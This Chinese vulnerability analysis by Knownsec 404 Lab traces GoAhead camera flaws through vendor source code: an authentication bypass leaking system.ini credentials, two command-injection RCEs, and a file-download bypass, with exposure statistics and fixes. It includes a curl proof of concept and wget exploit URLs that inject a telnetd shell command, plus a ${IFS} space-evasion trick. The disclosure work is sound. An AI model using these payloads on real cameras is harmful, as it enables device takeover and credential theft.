PDF 版本下载：[抓住“新代码”的影子 ——
基于GoAhead系列网络摄像头多个漏洞分析](http://paper.seebug.org/papers/Archive/%E6%8A%93%E4%BD%8F%E2%80%9D%E6%96%B0%E4%BB%A3%E7%A0%81%E2%80%9D%E7%9A%84%E5%BD%B1%E5%AD%90%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EGoAhead%E7%B3%BB%E5%88%97%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.pdf)

Author： **知道创宇404实验室** Date：2017/03/19

## 一.漏洞背景

[GoAhead](https://embedthis.com/goahead/)作为世界上最受欢迎的嵌入式Web服务器被部署在数亿台设备中，是各种嵌入式设备与应用的理想选择。当然，各厂商也会根据不同产品需求对其进行一定程度的二次开发。

2017年3月7日，Seebug漏洞平台收录了一篇[基于GoAhead系列摄像头的多个漏洞](https://www.seebug.org/vuldb/ssvid-92748)。该漏洞为Pierre
Kim在博客上发表的一篇[文章](https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html)，披露了存在于1250多个摄像头型号的多个通用型漏洞。其在文章中将其中一个验证绕过漏洞归类为GoAhead服务器的漏洞，但事后证明，该漏洞却是由厂商二次开发GoAhead服务器产生的。于此同时，Pierre
Kim将其中两个漏洞组合使用，成功获取了摄像头的最高权限。

## 二.漏洞分析

>
> 当我们开始着手分析这些漏洞时发现GoAhead官方源码不存在该漏洞，解开的更新固件无法找到对应程序，一系列困难接踵而至。好在根据该漏洞特殊变量名称loginuse和loginpas，我们在github上找到一个上个月还在修改的[门铃项目](https://github.com/kuangxingyiqing/bell-> jpg)。抓着这个“新代码”的影子，我们不仅分析出了漏洞原理，还通过分析结果找到了漏洞新的利用方式。
>
> 由于该项目依赖的一些外部环境导致无法正常编译，我们仅仅通过静态代码分析得出结论，因此难免有所疏漏。如有错误，欢迎指正。:)

### 1.验证绕过导致的信息（登录凭据）泄漏漏洞

    
    
    作者给出POC: curl http://ip:port/system.ini?loginuse&loginpas

根据作者给出的POC，我们进行了如下测试:

![](https://images.seebug.org/content/images/2017/03/-----4.png)

可以看出，只要`url`中含有`loginuse`和`loginpas`这两个值即无需验证。甚至当这两个值对应的账号密码为空或者为错误的`zzzzzzzzzzzzzz`时均可通过验证。

看到这里，我们大致可以判断出验证`loginuse`和`loginpas`的逻辑问题导致该漏洞的出现。于是，在此门铃项目中直接搜索`loginuse`定位到关键函数。

`/func/ieparam.c`第`6407-6485`行`AdjustUserPri`函数如下：

    
    
    unsigned char AdjustUserPri( char* url )
    {
        int     iRet;
        int     iRet1;
        unsigned char   byPri = 0;
        char        loginuse[32];
        char        loginpas[32];
        char        decoderbuf[128];
        char        temp2[128];
        memset( loginuse, 0x00, 32 );
        memset( loginpas, 0x00, 32 );
        memset( temp2, 0x00, 128 );
        iRet = GetStrParamValue( url, "loginuse", temp2, 31 );
    //判断是否存在loginuse值，并将获取到的值赋给temp2
        if ( iRet == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginuse, 0x00, 31 );
            strcpy( loginuse, decoderbuf );
        }
    //如果存在，则将temp2复制到loginuse数组中
        memset( temp2, 0x00, 128 );
        iRet1 = GetStrParamValue( url, "loginpas", temp2, 31 );
    //判断是否存在loginpas值，并将获取到的值赋给temp2
        if ( iRet1 == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginpas, 0x00, 31 );
            strcpy( loginpas, decoderbuf );
        }
    //如果存在，则将temp2复制到loginpas数组中
        if ( iRet == 0 )
        {
            if ( iRet1 == 0x00 )
            {
                //printf("user %s pwd:%s\n",loginuse,loginpas);
                byPri = GetUserPri( loginuse, loginpas );
    //如果两次都获取到了对应的值，则通过GetUserPri进行验证。
                return byPri;
            }
        }
    
        memset( loginuse, 0x00, 32 );
        memset( loginpas, 0x00, 32 );
        memset( temp2, 0x00, 128 );
        iRet = GetStrParamValue( url, "user", temp2, 31 );
    
        if ( iRet == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginuse, 0x00, 31 );
            strcpy( loginuse, decoderbuf );
        }
    
        memset( temp2, 0x00, 128 );
        iRet1 = GetStrParamValue( url, "pwd", temp2, 31 );
    
        if ( iRet1 == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginpas, 0x00, 31 );
            strcpy( loginpas, decoderbuf );
        }
    
        if ( iRet == 0 )
        {
            if ( iRet1 == 0x00 )
            {
                //printf("user %s pwd:%s\n",loginuse,loginpas);
                byPri = GetUserPri( loginuse, loginpas );
                return byPri;
            }
        }
    //获取user和pwd参数，逻辑结构与上方的loginuse和loginpas相同。
        return byPri;
    }

我们对其中步骤做了注释，根据这段逻辑，我们先通过`GetStrParamValue()`获取`loginuse`和`loginpas`对应值，然后将获取值通过`GetUserPri()`函数进行验证。跟进`GetStrParamValue()`这个函数，我们发现了更奇怪的事情。
`command/cmd_thread.c`中第`13-51`行`GetStrParamValue()`函数如下：

    
    
    //结合上面代码中的iRet = GetStrParamValue( url, "loginuse", temp2, 31 );审视这段代码
    int GetStrParamValue( const char* pszSrc, const char* pszParamName, char* pszParamValue )
    {
        const char* pos1, *pos = pszSrc;
        unsigned char       len = 0;
    
        if ( !pszSrc || !pszParamName )
        {
            return -1;
        }
    //判断url和需要查找的变量loginuse是否存在
    
        pos1 = strstr( pos, pszParamName );
    
        if ( !pos1 )
        {
            return -1;
        }
    //由于url中含有loginuse，所以这里pos1可以取到对应的值，故不进入if(!pos1)
    
        pos = pos1 + strlen( pszParamName ) + 1;
        pos1 = strstr( pos, "&" );
    
        if ( pos1 )
        {
            memcpy( pszParamValue, pos, pos1 - pos );
    //根据正常情况loginuse=admin&loginpas=xxx,这一段代码的逻辑是从loginuse后一位也就是等于号开始取值直到&号作为loginuse对应的值。
    //根据作者的POC:loginuse&loginpas，最终这里pos应该位于pos1后一位，所以pos1-pos = -1
    //memcpy( pszParamValue, pos, -1 );无法运行成功。
            len = pos1 - pos;
        }
    
        else
        {
            pos1 = strstr( pos, " " );
    
            if ( pos1 != NULL )
            {
                memcpy( pszParamValue, pos, pos1 - pos );
                len = pos1 - pos;
            }
        }
        return 0;
    //不论上述到底如何取值，最终都可以返回0
    }

根据作者给出的`POC`，在`memcpy()`函数处会导致崩溃，但事实上，我们的`web`服务器正常运行并返回`system.ini`具体内容。这一点令我们百思不得其解。当我们对`AdjustUserPri()`函数向上溯源时终于弄清楚是上层代码问题导致代码根本无法运行到这里，所以也不会导致崩溃。
`func/ieparam.c`文件第`7514-7543`行调用了`AdjustUserPri()`函数:

    
    
    if ( auth == 0x00 )
    {
        char temp[512];
        int  wlen = 0;
    
        if ( len )
        {
            return 0;
        }
    
        #if 0
        byPri = AdjustUserPri( url );
    
        printf("url:%s byPri %d\n",url,byPri);
        if ( byPri == 0x00 )
        {
            memset( temp, 0x00, 512 );
            wlen += sprintf( temp + wlen, "var result=\"Auth Failed\";\r\n" );
            memcpy( pbuf, temp, wlen );
            return wlen;
        }
        #else
        byPri = 255;
        #endif
    }
    
    else
    {
        byPri = pri;
    }

在之前跟`GetUserPri()`函数时有一行注释：`//result:0->error user or passwd error 1->vistor
2->opration
255->admin`。当我们回头再看这段函数时，可以发现开发者直接将验证部分注释掉，`byPri`被直接赋值为`255`，这就意味着只要进入这段逻辑，用户权限就直接是管理员了。这里已经可以解释本小节开篇进行的测试了，也就是为什么我们输入空的用户名和密码或者错误的用户名和密码也可以通过验证。

很遗憾，我们没有继续向上溯源找到这里的`auth`这个值到底是如何而来。不过根据这里的代码逻辑，我们可以猜测，当`auth`为`0`时，通过`GET请求中的参数`验证用户名密码。当`auth`不为`0`时，通过`HTTP摘要验证方式`来验证用户名密码。

再看一遍上方代码，`GET`请求中含有参数`loginuse`和`loginpas`就直接可以通过验证。那么`AdjustUserPri()`函数中另外两个具有相同逻辑的参数`user`和`pwd`呢?
![](https://images.seebug.org/content/images/2017/03/-----5.png)
**成功抓住"新代码"的影子**

### 2.远程命令执行漏洞一（需登录）

作者给出的exp如下:

    
    
    user@kali$ wget -qO- 'http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interval=0'
    user@kali$ wget -qO- 'http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=admin'

可以看到，该`exp`分为两步，第一步先设置`ftp`各种参数，第二步按照第一步设置的各参数测试`ftp`链接，同时导致我们在第一步设置的命令被执行。

我们在`func/ieparam.c`文件中找到了`set_ftp.cgi`和`ftptest.cgi`的调用过程

    
    
    383:    pdst = strstr( pcmd, "ftptest.cgi" );
    384:
    385:    if ( pdst != NULL )
    386:    {
    387:        return CGI_IESET_FTPTEST;
    388:    }
    
    455:    pdst = strstr( pcmd, "set_ftp.cgi" );
    456:
    457:    if ( pdst != NULL )
    458:    {
    459:        return CGI_IESET_FTP;
    460:    }
    
    7658:   case CGI_IESET_FTPTEST:
    7659:       if ( len == 0x00 )
    7660:       {
    7661:           iRet = cgisetftptest( pbuf, pparam, byPri );
    7662:       }
    
    7756:   case CGI_IESET_FTP:
    7757:       if ( len == 0x00 )
    7758:       {
    7759:           iRet = cgisetftp( pbuf, pparam, byPri );
    7760:           NoteSaveSem();
    7761:       }

首先跟踪`cgisetftp( pbuf, pparam, byPri
);`这个函数，我们发现，该函数仅仅是获取到我们请求的参数并将参数赋值给结构体中的各个变量。关键代码如下:

    
    
    //这部分代码可以不做细看，下一步我们进行ftp测试连接的时候对照该部分寻找对应的值就可以了。
        iRet = GetStrParamValue( pparam, "svr", temp2, 63 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 63 );
        strcpy( bparam.stFtpParam.szFtpSvr, decoderbuf );
    
        GetIntParamValue( pparam, "port", &iValue );
        bparam.stFtpParam.nFtpPort = iValue;
    
        iRet = GetStrParamValue( pparam, "user", temp2, 31 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 31 );
        strcpy( bparam.stFtpParam.szFtpUser, decoderbuf );
    
        memset( temp2, 0x00, 64 );
        iRet = GetStrParamValue( pparam, "pwd", temp2, 31 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 31 );
        strcpy( bparam.stFtpParam.szFtpPwd, decoderbuf );
    //我们构造的命名被赋值给了参数bparam.stFtpParam.szFtpPwd
        iRet = GetStrParamValue( pparam, "dir", temp2, 31 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 31 );
        strcpy( bparam.stFtpParam.szFtpDir, decoderbuf );
        if(decoderbuf[0] == 0)
        {
            strcpy(bparam.stFtpParam.szFtpDir, "/" );
        }
    
        GetIntParamValue( pparam, "mode", &iValue );
        bparam.stFtpParam.byMode = iValue;
        GetIntParamValue( pparam, "upload_interval", &iValue );
        bparam.stFtpParam.nInterTime = iValue;
    
        iRet = GetStrParamValue( pparam, "filename", temp1, 63 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 63 );
        strcpy( bparam.stFtpParam.szFileName, decoderbuf );

综上所述，`set_ftp.cgi`仅仅是将我们请求的各参数写入全局变量中。 接下来是`ftptest.cgi`部分，也就是调用了`iRet =
cgisetftptest( pbuf, pparam, byPri
);`这个函数。在该函数中，最为关键的函数为`DoFtpTest();`。直接跳到`func/ftp.c`文件中找到函数`DoFtpTest()`：

    
    
    int DoFtpTest( void )
    {
        int     iRet = 0;
        iRet = FtpConfig( 0x01, NULL );
    
        if ( iRet == 0 )
        {
            char cmd[128];
            memset(cmd, 0, 128);
            sprintf(cmd, "/tmp/ftpupdate1.sh > %s", FILE_FTP_TEST_RESULT);
            iRet = DoSystem(cmd);
            //iRet = DoSystem( "/tmp/ftpupdate1.sh > /tmp/ftpret.txt" );
        }
    
        return iRet;
    }

可以看到，执行 FtpConfig()函数后运行了/tmp/ftpupdate1.sh。先让我们看看 FtpConfig()函数如何 处理该问题：

    
    
    int FtpConfig( char test, char* filename )
    {
    ......
        fp = fopen( "/tmp/ftpupdate1.sh", "wb" );
    
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "/system/system/bin/ftp -n<<!\n" );
        fwrite( cmd, 1, strlen( cmd ), fp );
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "open %s %d\n", bparam.stFtpParam.szFtpSvr, bparam.stFtpParam.nFtpPort );
        fwrite( cmd, 1, strlen( cmd ), fp );
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "user %s %s\n", bparam.stFtpParam.szFtpUser, bparam.stFtpParam.szFtpPwd );
        fwrite( cmd, 1, strlen( cmd ), fp );
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "binary\n" );
        fwrite( cmd, 1, strlen( cmd ), fp );
    
        if ( bparam.stFtpParam.byMode == 1 )    //passive
        {
            memset( cmd, 0x00, 128 );
            sprintf( cmd, "pass\n" );
            fwrite( cmd, 1, strlen( cmd ), fp );
        }
    #ifdef CUSTOM_DIR
    
        char sub_temp[ 128 ];
        memset(sub_temp, 0, 128);
        //strcpy(sub_temp, bparam.stFtpParam.szFtpDir);
        sprintf(sub_temp, "%s/%s", bparam.stFtpParam.szFtpDir,bparam.stIEBaseParam.dwDeviceID); 
    
        flag = sub_dir(fp,sub_temp);
        if(flag){
            memset( cmd, 0x00, 128 );
            sprintf( cmd, "cd %s\n", bparam.stFtpParam.szFtpDir );
            fwrite( cmd, 1, strlen( cmd ), fp );
        }
    #else
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "cd %s\n", bparam.stFtpParam.szFtpDir );
        fwrite( cmd, 1, strlen( cmd ), fp );
    
    #endif
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "lcd /tmp\n" );
        fwrite( cmd, 1, strlen( cmd ), fp );
    
        if ( test == 0x01 )
        {
            FtpFileTest();
            memset( cmd, 0x00, 128 );
            sprintf( cmd, "put ftptest.txt\n" );
            fwrite( cmd, 1, strlen( cmd ), fp );
        }
    
        else
        {
            char    filename1[128];
            memset( filename1, 0x00, 128 );
            memcpy( filename1, filename + 5, strlen( filename ) - 5 );
            memset( cmd, 0x00, 128 );
            sprintf( cmd, "put %s\n", filename1 );
            fwrite( cmd, 1, strlen( cmd ), fp );
        }
    
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "close\n" );
        fwrite( cmd, 1, strlen( cmd ), fp );
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "bye\n" );
        fwrite( cmd, 1, strlen( cmd ), fp );
        memset( cmd, 0x00, 128 );
        sprintf( cmd, "!\n" );
        fwrite( cmd, 1, strlen( cmd ), fp );
        fclose( fp );
        iRet = access( "/tmp/ftpupdate1.sh", X_OK );
    
        if ( iRet )
        {
            DoSystem( "chmod a+x /tmp/ftpupdate1.sh" );
        }
    
        return 0;
    }

至此，逻辑很清晰了。在`FtpConfig()`函数中，将我们之前在设置的时候输入的各个值写入了`/tmp/ftpupdate1.sh`中，然后在`DoFtpTest()`中运行该脚本，导致最后的命令执行。这一点，同样可以在漏洞作者原文中得到证明:

    
    
    作者原文中展示的/tmp/ftpupload.sh:
    / # cat /tmp/ftpupload.sh 
    /bin/ftp -n<<!
    open 192.168.1.1 21
    user ftp $(telnetd -l /bin/sh -p 25)ftp
    binary
    lcd /tmp
    put ftptest.txt
    close
    bye
    !
    / #

实际测试中，我们发现:如果直接用作者给出的exp去尝试RCE往往是不能成功的。从`http://ip:port/get_params.cgi?user=username&pwd=password`可以发现，我们注入的命令在空格处被截断了。

![](https://images.seebug.org/content/images/2017/03/--1.png)

于是我们用${IFS}替换空格（还可以采用`+`代替空格）:

![](https://images.seebug.org/content/images/2017/03/--2.png)

但是由于有长度限制再次被截断，调整长度，最终成功执行命令:

![](https://images.seebug.org/content/images/2017/03/--3.png) **成功抓住新代码的影子**

### 3.GoAhead绕过验证文件下载漏洞

2017年3月9日，Pierre Kim在文章中增加了两个链接，描述了一个GoAhead
2.1.8版本之前的[任意文件下载漏洞](https://s3-us-west-1.amazonaws.com/cybereasonbucket/wp-content/uploads/2017/03/08194911/PeekabooIOwnYou.pdf)。攻击者通过使用该漏洞，再结合一个新的远程命令执行漏洞可以再次获取摄像头的最高权限。有意思的是，这个漏洞早在2004年就已被提出并成功修复[（http://aluigi.altervista.org/adv/goahead-adv2.txt）](http://aluigi.altervista.org/adv/goahead-adv2.txt)。但是由于众多摄像头仍然使用存在该漏洞的老代码，该漏洞仍然可以在众多摄像头设备复现。

我们也查找了此门铃项目中的GoAhead服务器版本。web/release.txt前三行内容如下：

    
    
    =====================================
    GoAhead WebServer 2.1.8 Release Notes
    =====================================

再仔细查看`websUrlHandlerRequest()`内容，发现并未对该漏洞进行修复，说明该漏洞也影响这个门铃项目。以此类推，本次受影响的摄像头应该也存在这个漏洞，果不其然：
![](https://images.seebug.org/content/images/2017/03/new.png-w331s)
那么，具体的漏洞成因又是如何呢?让我们来跟进`./web/LINUX/main.c`了解该漏洞的成因: `initWebs()`函数中，关键代码如下:

    
    
    154:   umOpen();
    
    157:   umAddGroup( T( "adm" ), 0x07, AM_DIGEST, FALSE, FALSE );
    
    159:   umAddUser( admu, admp, T( "adm" ), FALSE, FALSE );
    160:   umAddUser( "admin0", "admin0", T( "adm" ), FALSE, FALSE );
    161:   umAddUser( "admin1", "admin1", T( "adm" ), FALSE, FALSE );
    162:   umAddAccessLimit( T( "/" ), AM_DIGEST, FALSE, T( "adm" ) );
    
    224:   websUrlHandlerDefine( T( "" ), NULL, 0, websSecurityHandler, WEBS_HANDLER_FIRST );
    227:   websUrlHandlerDefine( T( "" ), NULL, 0, websDefaultHandler,WEBS_HANDLER_LAST );

其中，`150-160`中`um`开头的函数为用户权限控制的相关函数。主要做了以下四件事情: 1\. `umOpen()` 打开用户权限控制 2\.
`umAddGroup()` 增加用户组`adm`，并设置该用户组用户使用HTTP摘要认证方式登录 3\. `umAddUser()`
增加用户`admin`,`admin0`,`admin1`,并且这三个用户均属于`adm`用户组 4\. `umAddAccessLimit()`
增加限制路径`/`,凡是以`/`开头的路径都要通过`HTTP摘要认证`的方式登录属于`adm`组的用户。

紧接着，在`220`多行通过`websUrlHandlerDefine()`函数运行了两个`Handler`，`websSecurityHandler`和`websDefaultHandler`。在`websSecurityHandler`中，对`HTTP摘要认证方式`进行处理。关键代码如下：

    
    
    86:           accessLimit = umGetAccessLimit( path );
    
    115:         am = umGetAccessMethodForURL( accessLimit );
    116:         nRet = 0;
    
    118-242:  if ( ( flags & WEBS_LOCAL_REQUEST ) && ( debugSecurity == 0 ) ){……}
    
    245:         return nRet;

第86行，`umGetAccessLimit()`函数用于将我们请求的路径规范化，主要逻辑就是去除路径最后的`/`或者`\\`，确保我们请求的是一个文件。`umGetAccessMethodForURL()`函数用于获取我们请求的路径对应的权限。这里，我们请求的路径是`system.ini`，根据上文，我们的设置是对`/`路径需要进行`HTTP摘要认证`，由于程序判断`system.ini`不属于`/`路径，所以这里`am`为默认的`AM_INVALID`,即无需验证。

紧接着向下，`nRet`初始化赋值为0.在`118-242`行中，如果出现了账号密码错误等情况，则会将`nRet`赋值为`1`，表示验证不通过。但是由于我们请求的路径无需验证，所以判断结束时`nRet`仍为`0`。因此，顺利通过验证，获取到对应的文件内容。

**就这样，我们再次抓住了这个”新代码”的影子，虽然这个2004年的漏洞让我们不得不为新代码这三个字加上了双引号。**

### 4.远程命令执行漏洞二（需登录）

在Pierre Kim新增的两个链接中，还介绍了一种新的远程命令执行的方式。即通过`set_mail.cgi`和`mailtest.cgi`来执行命令。
与上一个远程命令执行漏洞一样，我们先在`func/ieparam.c`文件中找到`set_mail.cgi`和`mailtest.cgi`的调用过程

    
    
    257:    pdst = strstr( pcmd, "set_mail.cgi" );
    258:
    259:    if ( pdst != NULL )
    260:    {
    261:        return CGI_IESET_MAIL;
    262:    }
    
    348:    pdst = strstr( pcmd, "mailtest.cgi" );
    349:
    350:    if ( pdst != NULL )
    351:    {
    352:        return CGI_IESET_MAILTEST;
    353:}
    
    7674:   case CGI_IESET_MAILTEST:
    7675:       if ( len == 0x00 )
    7676:       {
    7677:           iRet = cgisetmailtest( pbuf, pparam, byPri );
    7678:       }
    7679:
    7680:       break;
    
    7746:   case CGI_IESET_MAIL:
    7747:       if ( len == 0x00 )
    7748:       {
    7749:           iRet = cgisetmail( pbuf, pparam, byPri );
    7750:           IETextout( "-------------OK--------" );
    7751:           NoteSaveSem();
    7752:       }
    7753:
    7754:       break;

跟上一个远程命令执行漏洞类似，`cgisetmail()`函数用于将各参数储存到结构体，例如`sender`参数赋值给`bparam.stMailParam.szSender`、`receiver1`参数赋值给`bparam.stMailParam.szReceiver1`。
接着，来到了`cgisetmailtest()`函数:

    
    
    int cgisetmailtest( unsigned char* pbuf, char* pparam, unsigned char byPri )
    {
        unsigned char   temp[2048];
        int             len = 0;
        int             result = 0;
        char            nexturl[64];
        int     iRet = 0;
        memset( temp, 0x00, 2048 );
    
        //iRet = DoMailTest();
        if(iRet == 0)
        {
            IETextout("Mail send over, OK or Not");
        }
        /* END:   Added by Baggio.wu, 2013/10/25 */
    
        memset( nexturl, 0x00, 64 );
        iRet = GetStrParamValue( pparam, "next_url", nexturl, 63 );
    
        if ( iRet == 0x00 )
        {
    #if 1
            len += RefreshUrl( temp + len, nexturl );
    #endif
            memcpy( pbuf, temp, len );
        }
    
        else
        {
            len += sprintf( temp + len, "var result=\"ok\";\r\n" );
            memcpy( pbuf, temp, len );
        }
    
        printf( "sendmail len:%d\n", len );
        return len;
    }

该函数第十行已被注释掉。这是使用此函数发送邮件证据的唯一可寻之处。虽然被注释掉了，我们也要继续跟踪`DoMailTest()`这个函数：

    
    
    int DoMailTest( void )  //email test
    {
        int     iRet = -1;
        char    cmd[256];
    
        if ( bparam.stMailParam.szSender[0] == 0 )
        {
            return -1;
        }
    
        if ( bparam.stMailParam.szReceiver1[0] != 0x00 )
        {
            iRet = EmailConfig();
    
            if ( iRet )
            {
                return -1;
            }
    
            memset( cmd, 0x00, 256 );
    
            /* BEGIN: Modified by Baggio.wu, 2013/9/9 */
            sprintf( cmd, "echo \"mail test ok\" | /system/system/bin/mailx -r %s -s \"mail test\"  %s",
                     bparam.stMailParam.szSender, bparam.stMailParam.szReceiver1 );
            //sprintf( cmd, "echo \"mail test ok\" | /system/system/bin/mailx -v -s \"mail test\"  %s",
            //         bparam.stMailParam.szReceiver1 );
    
            printf( "start cmd:%s\n", cmd );
            EmailWrite( cmd, strlen( cmd ) );
            //emailtest();
            printf( "cmd:%s\n", cmd );
    
        }
    
        return iRet;
    }

可以看到`sprintf( cmd, "echo \"mail test ok\" | /system/system/bin/mailx -r %s -s
\"mail test\" %s",bparam.stMailParam.szSender, bparam.stMailParam.szReceiver1
);`发件人和收件人都直接被拼接成命令导致最后的命令执行。

## 三.漏洞影响范围

`ZoomEye网络空间探测引擎`探测结果显示，全球范围内共查询到`78`万条历史记录。我们根据这`78`万条结果再次进行探测，发现这些设备一共存在三种情况：

  * 第一种是设备不存在漏洞。
  * 第二种是设备存在验证绕过漏洞，但是由于`web`目录下没有`system.ini`，导致最终无法被利用。 ![](https://images.seebug.org/content/images/2017/03/404.png-w331s) 可以看到，当我们直接请求`system.ini`的时候，显示需要认证，但是当我们绕过验证之后，却显示`404 not found`。

  * 最后一种是设备既存在验证绕过漏洞，又存在`system.ini`文件。这些设备就存在被入侵的风险。

我们统计了最后一种设备的数量，数据显示有近`7万`的设备存在被入侵的风险。这7万设备的国家分布图如下:
![](https://images.seebug.org/content/images/2017/03/----.png)
可以看出，美国、中国、韩国、法国、日本属于重灾区。我国一共有 7000 多台设备可能被入侵，其中近 6000
台位于香港。我们根据具体数据做成两张柱状图以便查看：

![](https://images.seebug.org/content/images/2017/03/---------.png)

![](https://images.seebug.org/content/images/2017/03/-----------.png)
（注：None为属于中国，但未解析出具体地址的IP）

**我们通过查询`ZoomEye网络空间探测引擎`历史记录，导出2016年1月1日，2017年1月1日和本报告编写时2017年3月14日三个时间点的数据进行分析。**

在这三个时间点，我们分别收录了`banner`中含有`GoAhead
5ccc069c403ebaf9f0171e9517f40e41`的设备26万台、65万台和78万台。
![](https://images.seebug.org/content/images/2017/03/-----1.png)

但是这些ip中，存在漏洞的设备增长趋势却完全不同。
![](https://images.seebug.org/content/images/2017/03/-----2.png)

可以看到，2016年1月1日已探明的设备中目前仅有2000多台存在漏洞，2017年1月1日之前探明的设备中有近3万台存在漏洞，仅仅两个多月后的今天，已有近7万台设备存在漏洞。

根据以上数据，我们可以做出如下判断：该漏洞出现时间大约是去年，直到今年被曝光之后才被大家所关注。在此期间，旧摄像头通过更新有漏洞固件的方式导致了该漏洞的出现，而那些新生产的摄像头则被销售到世界各地。根据今年新增的ip的地理位置，我们可以大致判断出这些存在漏洞的摄像头今年被销往何地。
![](https://images.seebug.org/content/images/2017/03/-----3.png)
根据数据，我们可以看到，主要销售到了美国、中国、韩国、日本。中国新增了5316台存在漏洞的摄像头，其中4000多台位于香港。

## 四.修复方案

1.将存在漏洞的摄像头设备放置于内网。 2.及时升级到最新固件。 3.对于可能被感染的设备，可以采取重启的方式来杀死驻留在内存里的恶意进程。

## 五.参考链接

  1. https://www.seebug.org/vuldb/ssvid-92789
  2. https://www.seebug.org/vuldb/ssvid-92748
  3. https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html
  4. https://github.com/kuangxingyiqing/bell-jpg
  5. http://aluigi.altervista.org/adv/goahead-adv2.txt

## 附表1:Pierre Kim给出的受影响设备列表:

列表如下：  
---  
3G+IPCam Other  
3SVISION Other  
3com CASA  
3com Other  
3xLogic Other  
3xLogic Radio  
4UCAM Other  
4XEM Other  
555 Other  
7Links 3677  
7Links 3677-675  
7Links 3720-675  
7Links 3720-919  
7Links IP-Cam-in  
7Links IP-Wi-Fi  
7Links IPC-760HD  
7Links IPC-770HD  
7Links Incam  
7Links Other  
7Links PX-3615-675  
7Links PX-3671-675  
7Links PX-3720-675  
7Links PX3309  
7Links PX3615  
7Links ipc-720  
7Links px-3675  
7Links px-3719-675  
7Links px-3720-675  
A4Tech Other  
ABS Other  
ADT RC8021W  
AGUILERA AQUILERA  
AJT AJT-019129-BBCEF  
ALinking ALC  
ALinking Other  
ALinking dax  
AMC Other  
ANRAN ip180  
APKLINK Other  
AQUILA AV-IPE03  
AQUILA AV-IPE04  
AVACOM 5060  
AVACOM 5980  
AVACOM H5060W  
AVACOM NEW  
AVACOM Other  
AVACOM h5060w  
AVACOM h5080w  
Acromedia IN-010  
Acromedia Other  
Advance Other  
Advanced+home lc-1140  
Aeoss J6358  
Aetos 400w  
Agasio A500W  
Agasio A502W  
Agasio A512  
Agasio A533W  
Agasio A602W  
Agasio A603W  
Agasio Other  
AirLink Other  
Airmobi HSC321  
Airsight Other  
Airsight X10  
Airsight X34A  
Airsight X36A  
Airsight XC39A  
Airsight XX34A  
Airsight XX36A  
Airsight XX40A  
Airsight XX60A  
Airsight x10  
Airsight x10Airsight  
Airsight xc36a  
Airsight xc49a  
Airsight xx39A  
Airsight xx40a  
Airsight xx49a  
Airsight xx51A  
Airsight xx51a  
Airsight xx52a  
Airsight xx59a  
Airsight xx60a  
Akai AK7400  
Akai SP-T03WP  
Alecto 150  
Alecto Atheros  
Alecto DVC-125IP  
Alecto DVC-150-IP  
Alecto DVC-1601  
Alecto DVC-215IP  
Alecto DVC-255-IP  
Alecto dv150  
Alecto dvc-150ip  
Alfa 0002HD  
Alfa Other  
Allnet 2213  
Allnet ALL2212  
Allnet ALL2213  
Amovision Other  
Android+IP+cam IPwebcam  
Anjiel ip-sd-sh13d  
Apexis AH9063CW  
Apexis APM-H803-WS  
Apexis APM-H804-WS  
Apexis APM-J011  
Apexis APM-J011-Richard  
Apexis APM-J011-WS  
Apexis APM-J012  
Apexis APM-J012-WS  
Apexis APM-J0233  
Apexis APM-J8015-WS  
Apexis GENERIC  
Apexis H  
Apexis HD  
Apexis J  
Apexis Other  
Apexis PIPCAM8  
Apexis Pyle  
Apexis XF-IP49  
Apexis apexis  
Apexis apm-  
Apexis dealextreme  
Aquila+Vizion Other  
Area51 Other  
ArmorView Other  
Asagio A622W  
Asagio Other  
Asgari 720U  
Asgari Other  
Asgari PTG2  
Asgari UIR-G2  
Atheros ar9285  
AvantGarde SUMPPLE  
Axis 1054  
Axis 241S  
B-Qtech Other  
B-Series B-1  
BRAUN HD-560  
BRAUN HD505  
Beaulieu Other  
Bionics Other  
Bionics ROBOCAM  
Bionics Robocam  
Bionics T6892WP  
Bionics t6892wp  
Black+Label B2601  
Bravolink Other  
Breno Other  
CDR+king APM-J011-WS  
CDR+king Other  
CDR+king SEC-015-C  
CDR+king SEC-016-NE  
CDR+king SEC-028-NE  
CDR+king SEC-029-NE  
CDR+king SEC-039-NE  
CDR+king sec-016-ne  
CDXX Other  
CDXXcamera Any  
CP+PLUS CP-EPK-HC10L1  
CPTCAM Other  
Camscam JWEV-372869-BCBAB  
Casa Other  
Cengiz Other  
Chinavasion Gunnie  
Chinavasion H30  
Chinavasion IP611W  
Chinavasion Other  
Chinavasion ip609aw  
Chinavasion ip611w  
Cloud MV1  
Cloud Other  
CnM IP103  
CnM Other  
CnM sec-ip-cam  
Compro NC150/420/500  
Comtac CS2  
Comtac CS9267  
Conceptronic CIPCAM720PTIWL  
Conceptronic cipcamptiwl  
Cybernova Other  
Cybernova WIP604  
Cybernova WIP604MW  
D-Link DCS-910  
D-Link DCS-930L  
